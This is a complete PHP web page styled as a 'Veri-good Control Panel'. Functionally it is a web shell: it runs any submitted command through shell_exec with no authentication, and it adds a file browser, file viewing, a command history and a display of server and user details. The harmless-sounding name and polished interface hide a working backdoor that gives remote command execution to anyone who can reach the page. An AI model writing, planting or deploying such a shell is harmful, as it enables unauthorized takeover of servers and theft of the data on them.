<?php
session_start();

// Initialize command history if it doesn't exist
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}

// Initialize working directory
if (!isset($_SESSION['working_directory'])) {
    $_SESSION['working_directory'] = getcwd();
}

// Change directory if requested
if (isset($_POST['cd']) && !empty($_POST['cd'])) {
    $newDir = $_POST['cd'];
    if (is_dir($newDir)) {
        chdir($newDir);
        $_SESSION['working_directory'] = getcwd();
    }
}

// Handle command execution
$output = "";
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = $_POST['command'];
    
    // Change directory command handling
    if (preg_match('/^cd\s+(.+)$/', $command, $matches)) {
        $dir = $matches[1];
        if (is_dir($dir)) {
            chdir($dir);
            $_SESSION['working_directory'] = getcwd();
            $output = "Changed directory to: " . getcwd();
        } else {
            $output = "Directory not found: $dir";
        }
    } else {
        // Execute the command in the current directory
        chdir($_SESSION['working_directory']);
        $output = shell_exec($command . " 2>&1");
    }
    
    // Add command to history
    if (!in_array($command, $_SESSION['command_history'])) {
        array_unshift($_SESSION['command_history'], $command);
        // Keep only the last 10 commands
        if (count($_SESSION['command_history']) > 10) {
            array_pop($_SESSION['command_history']);
        }
    }
}

// Get directory contents for file browser
function getDirectoryContents($path) {
    $items = [];
    $dir = opendir($path);
    
    while (($item = readdir($dir)) !== false) {
        if ($item == '.' || $item == '..') continue;
        
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        $type = is_dir($fullPath) ? 'dir' : 'file';
        $size = is_file($fullPath) ? filesize($fullPath) : '';
        $modified = date("Y-m-d H:i:s", filemtime($fullPath));
        
        $items[] = [ 'name' => $item, 'path' => $fullPath, 'type' => $type, 'size' => $size, 'modified' => $modified];
    }
    
    closedir($dir);
    
    // Sort directories first, then files
    usort($items, function($a, $b) {
        if ($a['type'] == $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] == 'dir' ? -1 : 1;
    });
    
    return $items;
}

$dirContents = getDirectoryContents($_SESSION['working_directory']);

// Get system info
$systemInfo = [
    'OS' => PHP_OS,
    'Server' => $_SERVER['SERVER_SOFTWARE'],
    'PHP Version' => phpversion(),
    'User' => get_current_user(),
    'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
    'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
];

// Function to format file size
function formatSize($bytes) { $units = ['B', 'KB', 'MB', 'GB', 'TB']; $i = 0; while ($bytes >= 1024 && $i < count($units) - 1) { $bytes /= 1024; $i++; }; return round($bytes, 2) . ' ' . $units[$i]; }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Veri-good Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root{--bg-primary:#0d1117;--bg-secondary:#161b22;--bg-tertiary:#21262d;--text-primary:#c9d1d9;--text-secondary:#8b949e;--accent:#58a6ff;--accent-hover:#79c0ff;--success:#3fb950;--danger:#f85149;--warning:#d29922;--border:#30363d}
        *{box-sizing:border-box;margin:0;padding:0}
        body{background-color:var(--bg-primary);color:var(--text-primary);font-family:'Courier New',monospace;line-height:1.6;overflow-x:hidden}
        .container{display:flex;flex-direction:column;height:100vh;max-width:100%;padding:0}
        header{background-color:var(--bg-tertiary);border-bottom:1px solid var(--border);padding:15px;display:flex;justify-content:space-between;align-items:center}
        h1{margin:0;color:var(--accent);font-size:24px;display:flex;align-items:center;gap:10px}
        .system-info{display:flex;gap:15px;font-size:12px}
        .system-info div{display:flex;align-items:center;gap:5px}
        .system-info i{color:var(--accent)}
        main{display:flex;flex:1;overflow:hidden}
        .file-browser{width:300px;background-color:var(--bg-secondary);border-right:1px solid var(--border);overflow-y:auto;padding:10px 0}
        .file-browser-header{padding:0 15px 10px;border-bottom:1px solid var(--border);margin-bottom:10px}
        .current-path{background-color:var(--bg-tertiary);padding:8px 15px;border-radius:4px;font-size:14px;word-break:break-all;margin-bottom:10px;display:flex;align-items:center;gap:5px}
        .file-list{list-style-type:none}
        .file-list li{padding:8px 15px;cursor:pointer;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--border);font-size:14px}
        .file-list li:hover{background-color:var(--bg-tertiary)}
        .file-list li .fa-folder{color:var(--warning)}
        .file-list li .fa-file{color:var(--text-secondary)}
        .file-details{font-size:12px;color:var(--text-secondary);margin-left:auto;text-align:right}
        .terminal-section{flex:1;display:flex;flex-direction:column;overflow:hidden}
        .terminal{flex:1;background-color:var(--bg-primary);padding:15px;overflow-y:auto;position:relative}
        .command-history{background-color:var(--bg-secondary);padding:10px 15px;border-bottom:1px solid var(--border);display:flex;gap:10px;overflow-x:auto;white-space:nowrap}
        .history-item{background-color:var(--bg-tertiary);color:var(--text-primary);border:1px solid var(--border);border-radius:4px;padding:5px 10px;font-size:12px;cursor:pointer}
        .history-item:hover{background-color:var(--accent);color:var(--bg-primary)}
        .command-form{display:flex;position:relative;margin-top:15px}
        .prompt{position:absolute;left:10px;top:12px;color:var(--accent);font-weight:bold}
        input[type="text"]{flex:1;background-color:var(--bg-tertiary);color:var(--text-primary);border:1px solid var(--border);border-radius:4px;padding:10px 10px 10px 35px;font-family:'Courier New',monospace;font-size:16px}
        input[type="text"]:focus{outline:none;border-color:var(--accent)}
        button{background-color:var(--accent);color:var(--bg-primary);border:none;border-radius:4px;margin-left:10px;padding:0 15px;cursor:pointer;transition:background-color .2s}
        button:hover{background-color:var(--accent-hover)}
        pre{background-color:transparent;color:var(--text-primary);white-space:pre-wrap;word-wrap:break-word;margin-top:15px;padding:15px;border:1px solid var(--border);border-radius:4px;overflow-x:auto;max-height:calc(100vh - 250px)}
        .hidden{display:none}
        .action-buttons{display:flex;gap:10px}
        .action-button{background-color:var(--bg-tertiary);color:var(--text-primary);border:1px solid var(--border);border-radius:4px;padding:5px 10px;cursor:pointer;font-size:14px;display:flex;align-items:center;gap:5px}
        .action-button:hover{background-color:var(--bg-secondary)}
        .action-button i{color:var(--accent)}
        @media (max-width:768px){main{flex-direction:column}.file-browser{width:100%;height:200px;border-right:none;border-bottom:1px solid var(--border)}.system-info{display:none}}
        @keyframes pulse{0%{opacity:1}50%{opacity:.5}100%{opacity:1}}
        .cursor{display:inline-block;width:8px;height:18px;background:var(--accent);margin-left:4px;animation:pulse 1s infinite}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1><i class="fas fa-terminal"></i> Veri-good Control Panel</h1>
            <div class="system-info">
                <div><i class="fas fa-server"></i> <?php echo htmlspecialchars($systemInfo['Server']); ?></div>
                <div><i class="fab fa-php"></i> <?php echo htmlspecialchars($systemInfo['PHP Version']); ?></div>
                <div><i class="fas fa-desktop"></i> <?php echo htmlspecialchars($systemInfo['OS']); ?></div>
                <div><i class="fas fa-user"></i> <?php echo htmlspecialchars($systemInfo['User']); ?></div>
                <div><i class="fas fa-network-wired"></i> <?php echo htmlspecialchars($systemInfo['Client IP']); ?></div>
            </div>
        </header>

        <main>
            <div class="file-browser">
                <div class="file-browser-header">
                    <h3>File Browser</h3>
                    <div class="current-path">
                        <i class="fas fa-folder-open"></i>
                        <?php echo htmlspecialchars($_SESSION['working_directory']); ?>
                    </div>
                </div>
                
                <ul class="file-list">
                    <?php if ($_SESSION['working_directory'] != dirname($_SESSION['working_directory'])): ?>
                        <li class="dir-item" data-path="<?php echo htmlspecialchars(dirname($_SESSION['working_directory'])); ?>">
                            <i class="fas fa-level-up-alt"></i> ..
                        </li>
                    <?php endif; ?>
                    <?php foreach ($dirContents as $item): ?>
                        <li class="<?php echo $item['type'] == 'dir' ? 'dir-item' : 'file-item'; ?>" 
                            data-path="<?php echo htmlspecialchars($item['path']); ?>">
                            <i class="fas <?php echo $item['type'] == 'dir' ? 'fa-folder' : 'fa-file'; ?>"></i>
                            <?php echo htmlspecialchars($item['name']); ?>
                            <div class="file-details">
                                <?php if ($item['type'] == 'file'): ?>
                                    <?php echo formatSize($item['size']); ?><br>
                                <?php endif; ?>
                                <?php echo $item['modified']; ?>
                            </div>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>

            <div class="terminal-section">
                <?php if (!empty($_SESSION['command_history'])): ?>
                    <div class="command-history">
                        <?php foreach ($_SESSION['command_history'] as $cmd): ?>
                            <div class="history-item" data-command="<?php echo htmlspecialchars($cmd); ?>">
                                <?php echo htmlspecialchars($cmd); ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>

                <div class="terminal">
                    <div class="action-buttons">
                        <button class="action-button" id="clearTerminal">
                            <i class="fas fa-eraser"></i> Clear
                        </button>
                        <button class="action-button" id="toggleFileBrowser">
                            <i class="fas fa-folder"></i> Files
                        </button>
                    </div>

                    <form method="POST" class="command-form">
                        <span class="prompt">$</span>
                        <input type="text" name="command" id="commandInput" placeholder="Enter command..." autofocus autocomplete="off" />
                        <input type="hidden" name="cd" id="cdInput" value="" />
                        <button type="submit"><i class="fas fa-play"></i></button>
                    </form>

                    <pre id="outputArea"><?php echo htmlspecialchars($output); ?></pre>
                </div>
            </div>
        </main>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Command history functionality
            const historyItems = document.querySelectorAll('.history-item');
            const commandInput = document.getElementById('commandInput');
            
            historyItems.forEach(item => {
                item.addEventListener('click', function() {
                    commandInput.value = this.getAttribute('data-command');
                    commandInput.focus();
                });
            });

            // Directory navigation
            const dirItems = document.querySelectorAll('.dir-item');
            const cdInput = document.getElementById('cdInput');
            const commandForm = document.querySelector('.command-form');
            
            dirItems.forEach(item => {
                item.addEventListener('click', function() {
                    cdInput.value = this.getAttribute('data-path');
                    commandForm.submit();
                });
            });

            // File content viewing with double click
            const fileItems = document.querySelectorAll('.file-item');
            
            fileItems.forEach(item => {
                item.addEventListener('dblclick', function() {
                    const filePath = this.getAttribute('data-path');
                    commandInput.value = 'cat "' + filePath + '"';
                    commandForm.submit();
                });
            });

            // Clear terminal
            document.getElementById('clearTerminal').addEventListener('click', function() {
                document.getElementById('outputArea').textContent = '';
            });

            // Toggle file browser on mobile
            document.getElementById('toggleFileBrowser').addEventListener('click', function() {
                const fileBrowser = document.querySelector('.file-browser');
                fileBrowser.classList.toggle('hidden');
            });

            // Auto-focus command input
            commandInput.focus();
        });
    </script>
</body>
</html>